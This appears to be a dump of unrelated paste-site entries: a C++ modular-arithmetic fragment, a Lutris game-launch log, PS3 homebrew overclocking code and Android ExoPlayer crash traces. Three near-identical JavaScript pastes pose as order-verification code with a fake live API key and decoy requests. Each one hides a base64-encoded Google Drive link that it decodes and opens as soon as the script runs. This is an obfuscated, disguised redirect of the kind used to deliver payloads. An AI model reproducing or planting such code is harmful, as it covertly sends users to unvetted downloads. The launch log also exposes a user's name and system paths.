    }

    static long long solve(long long *r, long long *m, int n, long long &lcm) {
        long long r0 = 0, m0 = 1;
        for (int i = 0; i < n; i++) {
            long long r1 = (r[i] % m[i] + m[i]) % m[i];
            long long m1 = m[i];
            if (m0 < m1) {
                swap(r0, r1);
                swap(m0, m1);
            }
            if (m0 % m1 == 0) {
                if (r0 % m1 != r1) {
                    lcm = 0;
                    return 0;
                }
                continue;
            }
            long long im, tmp;
            long long g = exgcd(m0, m1, im, tmp);
            long long u1 = (m1 / g);
            if ((r1 - r0) % g) {
                lcm = 0;
                return 0;
            }
            long long x = (r1 - r0) / g % u1 * im % u1;
            r0 += x * m0;
            m0 *= u1;
            if (r0 < 0) {
                r0 += m0;
            }
        }
        lcm = m0;
        return r0;
    }
};
"
b6VeqF4u,Market.js,Epiphemeral,JavaScript,Friday 18th of April 2025 10:17:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27845/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gasU3LB9,trying to run Anno 1800 in Lutris,Satscape,Bash,Friday 18th of April 2025 10:10:13 AM CDT,"lutris-wrapper: Anno 1800
Started initial process 489958 from gamemoderun /usr/bin/umu-run /home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64/Anno1800.exe LD_PRELOAD=$LD_PRELOAD:/usr/lib/libgamemodeauto.so.0
Start monitoring process.
[umu.__main__:78] DEBUG: SHELL=/bin/bash
[umu.__main__:78] DEBUG: SESSION_MANAGER=local/Pleiadian:@/tmp/.ICE-unix/953,unix/Pleiadian:/tmp/.ICE-unix/953
[umu.__main__:78] DEBUG: XDG_CONFIG_DIRS=/etc/xdg
[umu.__main__:78] DEBUG: XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0
[umu.__main__:78] DEBUG: XDG_MENU_PREFIX=xfce-
[umu.__main__:78] DEBUG: LC_ADDRESS=en_GB.UTF-8
[umu.__main__:78] DEBUG: LC_NAME=en_GB.UTF-8
[umu.__main__:78] DEBUG: SSH_AUTH_SOCK=/tmp/ssh-XXXXXXV3M6zh/agent.1015
[umu.__main__:78] DEBUG: __GL_SHADER_DISK_CACHE_PATH=/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64
[umu.__main__:78] DEBUG: XDG_CONFIG_HOME=/home/scott/.config
[umu.__main__:78] DEBUG: PROTON_NO_FSYNC=1
[umu.__main__:78] DEBUG: DESKTOP_SESSION=xfce
[umu.__main__:78] DEBUG: LC_MONETARY=en_GB.UTF-8
[umu.__main__:78] DEBUG: SSH_AGENT_PID=1019
[umu.__main__:78] DEBUG: WINE_MONO_CACHE_DIR=/home/scott/.local/share/lutris/runners/proton/ge-proton/files/mono
[umu.__main__:78] DEBUG: GTK_MODULES=canberra-gtk-module:canberra-gtk-module
[umu.__main__:78] DEBUG: XDG_SEAT=seat0
[umu.__main__:78] DEBUG: PWD=/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64
[umu.__main__:78] DEBUG: XDG_SESSION_DESKTOP=xfce
[umu.__main__:78] DEBUG: LOGNAME=scott
[umu.__main__:78] DEBUG: XDG_SESSION_TYPE=x11
[umu.__main__:78] DEBUG: PANEL_GDK_CORE_DEVICE_EVENTS=0
[umu.__main__:78] DEBUG: WINEESYNC=0
[umu.__main__:78] DEBUG: XAUTHORITY=/home/scott/.Xauthority
[umu.__main__:78] DEBUG: DESKTOP_STARTUP_ID=wrapper-2.0/lutris/1082-14-Pleiadian_TIME18106433
[umu.__main__:78] DEBUG: XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/scott
[umu.__main__:78] DEBUG: LUTRIS_GAME_UUID=125bbeb8-9dfa-4c9f-addc-80464d3718da
[umu.__main__:78] DEBUG: MOTD_SHOWN=pam
[umu.__main__:78] DEBUG: WINEARCH=win64
[umu.__main__:78] DEBUG: HOME=/home/scott
[umu.__main__:78] DEBUG: LANG=en_GB.UTF-8
[umu.__main__:78] DEBUG: LC_PAPER=en_GB.UTF-8
[umu.__main__:78] DEBUG: STORE=none
[umu.__main__:78] DEBUG: WINEPREFIX=/home/scott/Various/wine
[umu.__main__:78] DEBUG: XDG_CURRENT_DESKTOP=XFCE
[umu.__main__:78] DEBUG: DXVK_LOG_LEVEL=error
[umu.__main__:78] DEBUG: WEBKIT_DISABLE_DMABUF_RENDERER=1
[umu.__main__:78] DEBUG: XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0
[umu.__main__:78] DEBUG: PROTON_VERB=waitforexitandrun
[umu.__main__:78] DEBUG: PROTON_NO_ESYNC=1
[umu.__main__:78] DEBUG: XDG_CACHE_HOME=/home/scott/.cache
[umu.__main__:78] DEBUG: WINEDLLOVERRIDES=winemenubuilder=
[umu.__main__:78] DEBUG: XDG_SESSION_CLASS=user
[umu.__main__:78] DEBUG: LC_IDENTIFICATION=en_GB.UTF-8
[umu.__main__:78] DEBUG: __GL_SHADER_DISK_CACHE=1
[umu.__main__:78] DEBUG: USER=scott
[umu.__main__:78] DEBUG: WINE_LARGE_ADDRESS_AWARE=1
[umu.__main__:78] DEBUG: CUDA_PATH=/opt/cuda
[umu.__main__:78] DEBUG: PYTHONIOENCODING=utf-8
[umu.__main__:78] DEBUG: GAME_NAME=Anno 1800
[umu.__main__:78] DEBUG: DISPLAY=:0.0
[umu.__main__:78] DEBUG: SHLVL=0
[umu.__main__:78] DEBUG: WINE_GECKO_CACHE_DIR=/home/scott/.local/share/lutris/runners/proton/ge-proton/files/gecko
[umu.__main__:78] DEBUG: LC_TELEPHONE=en_GB.UTF-8
[umu.__main__:78] DEBUG: LC_MEASUREMENT=en_GB.UTF-8
[umu.__main__:78] DEBUG: XDG_VTNR=7
[umu.__main__:78] DEBUG: XDG_SESSION_ID=1
[umu.__main__:78] DEBUG: WINEDEBUG=-all
[umu.__main__:78] DEBUG: LD_LIBRARY_PATH=/home/scott/.local/share/lutris/runners/proton/ge-proton/files/lib:/home/scott/.local/share/lutris/runners/proton/ge-proton/files/lib64:/usr/lib:/usr/lib32:/opt/cuda/lib64:/opt/intel/oneapi/compiler/latest/lib:/opt/cuda/extras/CUPTI/lib64:/opt/cuda/nvvm/lib64:/usr/lib64:/home/scott/.local/share/lutris/runtime/Ubuntu-18.04-i686:/home/scott/.local/share/lutris/runtime/steam/i386/lib/i386-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/i386/lib:/home/scott/.local/share/lutris/runtime/steam/i386/usr/lib/i386-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/i386/usr/lib:/home/scott/.local/share/lutris/runtime/Ubuntu-18.04-x86_64:/home/scott/.local/share/lutris/runtime/steam/amd64/lib/x86_64-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/amd64/lib:/home/scott/.local/share/lutris/runtime/steam/amd64/usr/lib/x86_64-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/amd64/usr/lib
[umu.__main__:78] DEBUG: XDG_RUNTIME_DIR=/run/user/1000
[umu.__main__:78] DEBUG: NVCC_CCBIN=/usr/bin/g++-13
[umu.__main__:78] DEBUG: DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
[umu.__main__:78] DEBUG: LC_TIME=en_GB.UTF-8
[umu.__main__:78] DEBUG: GTK3_MODULES=xapp-gtk3-module:xapp-gtk3-module
[umu.__main__:78] DEBUG: XDG_DATA_DIRS=/home/scott/.local/share/flatpak/exports/share:/var/lib/flatpak/exports/share:/usr/local/share:/usr/share:/var/lib/snapd/desktop:/usr/share
[umu.__main__:78] DEBUG: PROTON_DXVK_D3D8=1
[umu.__main__:78] DEBUG: PROTONPATH=/home/scott/.local/share/lutris/runners/proton/ge-proton
[umu.__main__:78] DEBUG: PATH=/home/scott/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/opt/cuda/bin:/opt/cuda/nsight_compute:/opt/cuda/nsight_systems/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/var/lib/snapd/snap/bin
[umu.__main__:78] DEBUG: GDMSESSION=xfce
[umu.__main__:78] DEBUG: DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
[umu.__main__:78] DEBUG: WINE=/home/scott/.local/share/lutris/runners/proton/ge-proton/files/bin/wine
[umu.__main__:78] DEBUG: MAIL=/var/spool/mail/scott
[umu.__main__:78] DEBUG: UMU_LOG=1
[umu.__main__:78] DEBUG: WINEFSYNC=0
[umu.__main__:78] DEBUG: LC_NUMERIC=en_GB.UTF-8
[umu.__main__:78] DEBUG: GAMEID=umu-default
[umu.__main__:78] DEBUG: LD_PRELOAD=libgamemodeauto.so.0
[umu.umu_run:802] INFO: umu-launcher version 1.2.6 (3.13.2 (main, Feb  5 2025, 08:05:21) [GCC 14.2.1 20250128])
[umu.umu_run:808] DEBUG: Connecting to '1.1.1.1'...
[umu.umu_run:724] DEBUG: PROTONPATH set, resolving its required runtime
[umu.umu_runtime:277] DEBUG: Local: /home/scott/.local/share/umu/steamrt3
[umu.umu_runtime:322] DEBUG: Existing install detected
[umu.umu_runtime:323] DEBUG: Using container runtime 'steamrt3' aka 'sniper'
[umu.umu_runtime:324] DEBUG: Checking updates for 'steamrt3'...
[umu.umu_run:889] DEBUG: WINEPREFIX=/home/scott/Various/wine
[umu.umu_run:889] DEBUG: GAMEID=umu-default
[umu.umu_run:889] DEBUG: PROTON_CRASH_REPORT_DIR=/tmp/umu_crashreports
[umu.umu_run:889] DEBUG: PROTONPATH=/home/scott/.local/share/lutris/runners/proton/ge-proton
[umu.umu_run:889] DEBUG: STEAM_COMPAT_APP_ID=default
[umu.umu_run:889] DEBUG: STEAM_COMPAT_TOOL_PATHS=/home/scott/.local/share/lutris/runners/proton/ge-proton:/home/scott/.local/share/umu/steamrt3
[umu.umu_run:889] DEBUG: STEAM_COMPAT_LIBRARY_PATHS=/home/scott/Various
[umu.umu_run:889] DEBUG: STEAM_COMPAT_MOUNTS=/home/scott/.local/share/lutris/runners/proton/ge-proton:/home/scott/.local/share/umu/steamrt3
[umu.umu_run:889] DEBUG: STEAM_COMPAT_INSTALL_PATH=/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64
[umu.umu_run:889] DEBUG: STEAM_COMPAT_CLIENT_INSTALL_PATH=
[umu.umu_run:889] DEBUG: STEAM_COMPAT_DATA_PATH=/home/scott/Various/wine
[umu.umu_run:889] DEBUG: STEAM_COMPAT_SHADER_PATH=/home/scott/Various/wine/shadercache
[umu.umu_run:889] DEBUG: FONTCONFIG_PATH=
[umu.umu_run:889] DEBUG: EXE=/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64/Anno1800.exe
[umu.umu_run:889] DEBUG: SteamAppId=default
[umu.umu_run:889] DEBUG: SteamGameId=default
[umu.umu_run:889] DEBUG: STEAM_RUNTIME_LIBRARY_PATH=/opt/cuda/nvvm/lib64:/home/scott/.local/share/lutris/runtime/steam/i386/lib/i386-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/amd64/lib/x86_64-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/amd64/usr/lib/x86_64-linux-gnu:/opt/cuda/lib64:/opt/cuda/extras/CUPTI/lib64:/opt/cuda/targets/x86_64-linux/lib:/home/scott/.local/share/lutris/runners/proton/ge-proton/files/lib:/opt/intel/oneapi/compiler/2025.0/lib:/home/scott/.local/share/lutris/runtime/steam/i386/lib:/home/scott/.local/share/lutris/runtime/steam/i386/usr/lib:/usr/lib:/usr/lib64:/opt/intel/oneapi/compiler/latest/lib:/usr/lib32:/home/scott/.local/share/lutris/runtime/Ubuntu-18.04-x86_64:/home/scott/.local/share/lutris/runtime/steam/i386/usr/lib/i386-linux-gnu:/home/scott/.local/share/lutris/runtime/steam/amd64/lib:/home/scott/.local/share/lutris/runtime/steam/amd64/usr/lib:/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64:/home/scott/.local/share/lutris/runtime/Ubuntu-18.04-i686:/home/scott/.local/share/lutris/runners/proton/ge-proton/files/lib64
[umu.umu_run:889] DEBUG: STORE=none
[umu.umu_run:889] DEBUG: PROTON_VERB=waitforexitandrun
[umu.umu_run:889] DEBUG: UMU_ID=umu-default
[umu.umu_run:889] DEBUG: UMU_ZENITY=
[umu.umu_run:889] DEBUG: UMU_NO_RUNTIME=
[umu.umu_run:889] DEBUG: UMU_RUNTIME_UPDATE=
[umu.umu_run:889] DEBUG: UMU_NO_PROTON=
[umu.umu_run:889] DEBUG: RUNTIMEPATH=/home/scott/.local/share/umu/steamrt3
[umu.umu_runtime:387] INFO: steamrt3 is up to date
[umu.umu_run:911] DEBUG: (PosixPath('/home/scott/.local/share/umu/steamrt3/umu'), '--verb', 'waitforexitandrun', '--', PosixPath('/home/scott/.local/share/umu/steamrt3/umu-shim'), PosixPath('/home/scott/.local/share/lutris/runners/proton/ge-proton/proton'), 'waitforexitandrun', '/home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64/Anno1800.exe', 'LD_PRELOAD=$LD_PRELOAD:/usr/lib/libgamemodeauto.so.0')
[umu.umu_run:689] DEBUG: prctl exited with status: 0
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ProtonFixes[490149] WARN: [CONFIG]: Parent directory ""/home/scott/.config/protonfixes"" does not exist. Abort.
ProtonFixes[490149] INFO: Running protonfixes
ProtonFixes[490149] INFO: Running checks
ProtonFixes[490149] INFO: All checks successful
ProtonFixes[490149] WARN: Game title not found in CSV
ProtonFixes[490149] INFO: Non-steam game UNKNOWN (umu-default)
ProtonFixes[490149] INFO: No store specified, using UMU database
ProtonFixes[490149] INFO: Using global defaults for UNKNOWN (umu-default)
ProtonFixes[490149] INFO: Non-steam game UNKNOWN (umu-default)
ProtonFixes[490149] INFO: No store specified, using UMU database
ProtonFixes[490149] INFO: No global protonfix found for UNKNOWN (umu-default)
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Proton: /home/scott/Various/wine/drive_c/Games/Anno1800/Bin/Win64/Anno1800.exe
Proton: Executable a unix path, launching with /unix option.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
wineserver: using server-side synchronization.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Command exited with status: 0
ERROR: ld.so: object 'libgamemodeauto.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
[umu.umu_run:693] DEBUG: Child 490020 exited with wait status: 0
Monitored process exited.
Initial process has exited (return code: 0)
All processes have quit
Exit with return code 0
"
JDpjNRNF,Untitled,Epiphemeral,JavaScript,Friday 18th of April 2025 10:02:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
E1RLmgPu,Products.js,Epiphemeral,JavaScript,Friday 18th of April 2025 09:46:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QnuNgXSD,Untitled,Evilnat,C,Friday 18th of April 2025 09:42:56 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include ""functions.h""
#include ""gccpch.h""
#include ""log.h""
#include ""overclock.h""

#define RSX_MEMORY_FREQ_OFFSET		0x28000004010ULL
#define RSX_CORE_FREQ_OFFSET		0x28000004028ULL

static wchar_t wchar_string[360]; // Global variable for swprintf

int getClockSpeeds()
{
	uint8_t memoryArray[8], coreArray[8];
	uint64_t initialValue;	

	// HEN
	if(!is_hen())
	{
		showMessage(""msg_hen_notsupported_error"", (char *)XAI_PLUGIN, (char *)TEX_ERROR);
		return 1;
	}

	// Check if CFW Syscalls are disabled
	if(checkSyscalls(LV1))
	{
		showMessage(""msg_cfw_syscalls_disabled"", (char *)XAI_PLUGIN, (char *)TEX_ERROR);
		return 1;
	}

	initialValue = lv1_peek(RSX_MEMORY_FREQ_OFFSET);
	memcpy(memoryArray, &initialValue, 8);

	initialValue = lv1_peek(RSX_CORE_FREQ_OFFSET);
	memcpy(coreArray, &initialValue, 8);

	int string = RetrieveString(""msg_clock_speeds"", (char*)XAI_PLUGIN);	
	swprintf_(wchar_string, 120, (wchar_t*)string, (int)coreArray[6] * 50, (int)memoryArray[6] * 25);	
	PrintString(wchar_string, (char*)XAI_PLUGIN, (char*)TEX_SUCCESS);

	return 0;
}

int set_overclock_freq(uint8_t core, uint8_t memory, int mode)
{
	uint8_t memoryArray[8], coreArray[8];
	uint64_t value;	

	// HEN
	if(!is_hen())
	{
		showMessage(""msg_hen_notsupported_error"", (char *)XAI_PLUGIN, (char *)TEX_ERROR);
		return 1;
	}

	// Check if CFW Syscalls are disabled
	if(checkSyscalls(LV1))
	{
		showMessage(""msg_cfw_syscalls_disabled"", (char *)XAI_PLUGIN, (char *)TEX_ERROR);
		return 1;
	}		

	if(mode == MODE_FULL || mode == MODE_MEMORY)
	{
		value = lv1_peek(RSX_MEMORY_FREQ_OFFSET);
		memcpy(memoryArray, &value, 8);
		memoryArray[6] = memory;
		value = *(uint64_t *)memoryArray;
		lv1_poke(RSX_MEMORY_FREQ_OFFSET, value);
	}

	if(mode == MODE_FULL || mode == MODE_CORE)
	{
		value = lv1_peek(RSX_CORE_FREQ_OFFSET);
		memcpy(coreArray, &value, 8);
		coreArray[6] = core;
		value = *(uint64_t *)coreArray;
		lv1_poke(RSX_CORE_FREQ_OFFSET, value);
	}

	getClockSpeeds();

	return 0;
}"
4Ci3Z2Tk,2025-04-18T16:37:30.543482,powerampache,PHP,Friday 18th of April 2025 09:37:30 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360971993,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
ypyDaaEW,2025-04-18T16:37:30.397196,powerampache,PHP,Friday 18th of April 2025 09:37:30 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360971557,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the 